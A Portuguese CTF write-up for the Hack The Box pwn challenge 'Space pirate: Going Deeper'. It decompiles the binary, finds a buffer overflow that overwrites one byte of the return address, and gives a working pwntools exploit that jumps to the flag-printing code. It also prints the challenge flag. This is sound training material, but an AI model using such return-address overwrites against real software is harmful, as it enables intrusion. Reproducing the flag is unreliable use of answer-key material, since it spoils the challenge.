# WriteUp: Space pirate: Going Deeper

## Descrição do Desafio:
**Autor**: [w3th4nds](https://app.hackthebox.com/users/70668) \
**Plataforma**: [Hack The Box](https://app.hackthebox.com/challenges/Space%2520pirate%253A%2520Going%2520Deeper) \
**Categoria**: Pwn \
**Dificuldade**: Muito fácil \
**Data**: 2022 \
**Descrição**:
> We are inside D12! We bypassed the scanning system, and now we are right in front of the Admin Panel. The problem is that there are some safety mechanisms enabled so that not everyone can access the admin panel and become the user right below Draeger. Only a few of his intergalactic team members have access there, and they are the mutants that Draeger trusts. Can you disable the mechanisms and take control of the Admin Panel?

## Passo a Passo da Solução
### 1. Análise do executável fornecido
Este desafio não fornece o código-fonte, dessa forma, a análise deve ser feita diretamente pelo executável, analisando sua execução e assembly.

Rodando o executável temos uma leve noção do que está acontecendo. Nele é imprimido uma interface que nos mostra o histórico de comandos, e em seguida mostra 3 escolhas:

1. Desabilitar mecanismos.
2. Entrar.
3. Sair.

Após selecionar uma das opções, excluindo a terceira, podemos inserir algum texto. Mas em ambos os casos a saída é:

```bash
[-] Authentication failed!

[!] For security reasons, you are logged out..
```

Neste ponto, sobra analisar o assembly, no caso pelo **Ghidra**, para entender mais sobre o que está acontecendo.

Logo de início já podemos identificar a função `main()`, que define algumas variáveis de execução chamando a função `setup()`, e depois imprime a interface chamando a função `banner()`. Por fim é chamada a função `admin_panel(1,2,3)` que realiza toda a lógica da entrada do usuário. 

{% code title="main" overflow="wrap" lineNumbers="true" %}
```c
undefined8 main(void)

{
  setup();
  banner();
  puts("\x1b[1;34m");
  admin_panel(1,2,3);
  return 0;
}

```
{% endcode %}

Analisando a função `admin_panel()`, vemos muitas coisas interessantes:
- Não importa se foi selecionado 1 ou 2 no início, o código que continua é o mesmo nas duas opções. A terceira opção encerra a execução.
- No *input* que fazemos após inserir a opção, é possível realizar um `buffer overflow` de 17 caracteres.
- A **flag** é impressa caso os parâmetros sejam iguais a `0xdeadbeef`, `0x1337c0de`, e `0x1337beef`. E o *input* contenha `DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft`.

{% code title="admin_panel" overflow="wrap" lineNumbers="true" %}
```c
void admin_panel(long param_1,long param_2,long param_3)

{
  int iVar1;
  char local_38 [40];
  long local_10;
  
  local_10 = 0;
  printf("[*] Safety mechanisms are enabled!\n[*] Values are set to: a = [%x], b = [%ld], c = [%ld]. \n[*] If you want to continue, disable the mechanism or login as admin.\n"
         ,param_1,param_2,param_3);
  while (((local_10 != 1 && (local_10 != 2)) && (local_10 != 3))) {
    printf(&DAT_004014e8);
    local_10 = read_num();
  }
  if (local_10 == 1) {
    printf("\n[*] Input: ");
  }
  else {
    if (local_10 != 2) {
      puts("\n[!] Exiting..\n");
                    /* WARNING: Subroutine does not return */
      exit(0x1b39);
    }
    printf("\n[*] Username: ");
  }
                    /* Buffer Overflow */
  read(0,local_38,57);
  if (((param_1 == 0xdeadbeef) && (param_2 == 0x1337c0de)) && (param_3 == 0x1337beef)) {
    iVar1 = strncmp("DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft",local_38,52);
    if (iVar1 != 0) {
      printf("\n%s[+] Welcome admin! The secret message is: ",&DAT_00400c38);
      system("cat flag*");
      goto LAB_00400b38;
    }
  }
  printf("\n%s[-] Authentication failed!\n",&DAT_00400c40);
LAB_00400b38:
  puts("\n[!] For security reasons, you are logged out..\n");
  return;
}

```
{% endcode %}

O que este código deixa a entender é que devemos causar um estouro no *buffer*, colocando o valor `DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft` nele, e depois sobrescrevendo o valor dos parâmetros passados. Porém, este executável está na arquitetura **64-bits**, então os parâmetros são passados por meio dos registradores, e 17 caracteres a mais não seria o suficiente para escrever a *string* e sobrescrever os parâmetros.

{% hint style="info" %}
**Nota:** É possível observar que mesmo sendo arquitetura **64-bits**, os parâmetros são colocados na pilha no início do assembly da função. Porém, eles são colocados antes do *buffer*, dessa forma é impossível sobrescrever eles estourando o *buffer*.
{% endhint %}

### 2. Solução
Após descobrir que não era possível sobrescrever os parâmetros, eu estourei o *buffer* com os 57 caracteres sendo "A", para ver se algo interessante acontecia. Nisso, eu reparei algo interessante pelo **pwndbg**, o endereço de retorno mudou um pouco.

Antes do *input*:
```bash
 ► 0         0x400aba admin_panel+209
   1         0x400b94 main+77
```
Após o *input*:
```bash
 ► 0         0x400abf admin_panel+214
   1         0x400b41 admin_panel+344
```

O endereço de retorno é sobrescrevido por 1 *byte*, como podemos ver antes era `0x400b94` e depois passou a ser `0x400b41`, sendo que `0x41` é o hexadecimal para o caractere "A".

Dessa forma, a solução é sobrescrever esse 1 *byte* de forma que a função `admin_panel()` retorne para a instrução dela que imprime a **flag**. Isso só é possível caso essa instrução comece com `0x400b` e por sorte ela começa.

{% code title="assembly" overflow="wrap" lineNumbers="true" %}
```asm
        00400afa 48 8d 35        LEA        RSI,[DAT_00400c38]                               = 1Bh
                 37 01 00 00
        00400b01 48 8d 3d        LEA        RDI,[s_%s[+]_Welcome_admin!_The_secret_m_00401   = "\n%s[+] Welcome admin! The se
                 88 0a 00 00
        00400b08 b8 00 00        MOV        EAX,0x0
                 00 00
        00400b0d e8 fe fb        CALL       <EXTERNAL>::printf                               int printf(char * __format, ...)
                 ff ff
        00400b12 48 8d 3d        LEA        RDI,[s_cat_flag*_004015be]                       = "cat flag*"
                 a5 0a 00 00
        00400b19 e8 e2 fb        CALL       <EXTERNAL>::system                               int system(char * __command)
                 ff ff

```
{% endcode %}

Então, a solução nada mais é do que inserir 56 caracteres quaisquers, e depois inserir o hexadecimal `0x12`.

{% code title="solve.py" overflow="wrap" lineNumbers="true" %}

```py
from pwn import *

elf = context.binary = ELF("./sp_going_deeper")
p = remote("ip", porta)
#p = process()

p.sendlineafter(b">> ", b"1")

payload = b"A" * 56 + chr(0x12).encode()
p.sendlineafter(b"Input: ", payload)

print(p.recvall().decode())
```

### Flag
`HTB{d1g_1n51d3..u_Cry_cry_cry}`

## Autor da WriteUp
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)
